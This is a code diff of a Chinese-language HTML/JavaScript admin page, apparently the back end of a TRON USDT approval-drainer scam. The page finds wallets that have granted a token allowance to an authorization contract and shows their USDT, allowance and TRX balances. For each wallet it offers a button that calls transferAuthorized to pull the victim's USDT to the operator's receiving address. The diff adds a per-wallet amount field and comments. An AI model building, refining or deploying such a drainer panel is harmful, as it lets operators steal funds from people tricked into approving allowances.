@@ -14,26 +14,18 @@
     }
     button { background: #00b894; color: white; padding: 0.5em 1em; border: none; border-radius: 5px; cursor: pointer; }
     .error { color: red; }
-    #status { margin-top: 1em; font-weight: bold; }
   </style>
 </head>
 <body>
   <h1>🔐 USDT 授權監控後台</h1>
   <div id="status">🔍 正在檢查 TronLink...</div>
   
-  <!-- 查詢輸入框 -->
-  <div style="margin-top: 2em;">
+  <div>
     <input type="text" id="checkWallet" placeholder="輸入錢包地址查詢" /> 
     <button onclick="checkWallet()">查詢是否授權</button>
   </div>
 
-  <!-- 輸入轉帳金額 -->
-  <div style="margin-top: 2em;">
-    <input type="number" id="transferAmount" placeholder="輸入轉帳金額 (USDT)" /> 
-    <button onclick="triggerTransfer()">觸發轉帳</button>
-  </div>
-
-  <!-- 授權錢包顯示區域 -->
+  <!-- 顯示已授權錢包 -->
   <div id="wallets"></div>
 
   <script>
@@ -57,6 +49,7 @@
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
         const value = parseFloat(allowance) / 1e6; // USDT 精度是 1e6
 
+        // 如果這個錢包有授權，且該錢包不在已授權錢包列表中，將其加入列表
         if (value > 0 && !approvedWallets.includes(address)) {
           approvedWallets.push(address);
           displayWallets();
@@ -68,16 +61,18 @@
       }
     }
 
+    // 顯示所有授權錢包
     async function displayWallets() {
       const walletsDiv = document.getElementById("wallets");
-      walletsDiv.innerHTML = "";
+      walletsDiv.innerHTML = "";  // 清空顯示區域
+
       const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
       const html = await Promise.all(approvedWallets.map(async (addr) => {
         try {
           const balance = await usdt.balanceOf(addr).call();
           const allowance = await usdt.allowance(addr, AUTH_CONTRACT).call();
           const trxBalance = await window.tronWeb.trx.getBalance(addr);
-          const usdtAmt = parseFloat(balance) / 1e6;
+          const usdtAmt = parseFloat(balance) / 1e6; // 轉換為 USDT 精度
           const allowAmt = parseFloat(allowance) / 1e6;
           const trx = parseFloat(trxBalance) / 1e6;
 
@@ -86,33 +81,37 @@
             <div>USDT：${usdtAmt}</div>
             <div>授權額度：${allowAmt}</div>
             <div>TRX 餘額：${trx}</div>
+            <!-- 顯示每個錢包的轉帳金額輸入框 -->
+            <input type="number" id="transferAmount-${addr}" placeholder="輸入轉帳金額 (USDT)" />
             <button onclick="triggerTransfer('${addr}')">🚀 觸發轉帳</button>
           </div>`;
         } catch {
           return `<div class="wallet-card error">⚠️ ${addr} - 無法取得資料</div>`;
         }
       }));
-      walletsDiv.innerHTML = html.join("");
+      walletsDiv.innerHTML = html.join("");  // 更新顯示
     }
 
+    // 觸發轉帳
     async function triggerTransfer(from) {
-      const amountInput = document.getElementById("transferAmount").value;
+      const amountInput = document.getElementById(`transferAmount-${from}`).value;
       if (!amountInput || parseFloat(amountInput) <= 0) {
         return alert("請輸入有效的轉帳金額");
       }
 
-      try {
-        const amount = parseFloat(amountInput) * 1e6;  // 轉換為 USDT 精度的單位
+      const amount = parseFloat(amountInput) * 1e6;  // 轉換為 USDT 精度的單位
 
+      try {
         const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
         await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
 
-        alert(`✅ 已觸發轉帳 ${amountInput} USDT from ${from}`);
+        alert(`✅ 已觸發轉帳 ${amountInput} USDT 從 ${from}`);
       } catch (err) {
         alert("❌ 轉帳失敗：" + err.message);
       }
     }
 
+    // 啟動時檢查是否能連接 TronLink
     window.addEventListener("load", () => {
       let attempts = 0;
       const check = setInterval(() => {
@@ -133,3 +132,4 @@
   </script>
 </body>
 </html>
+
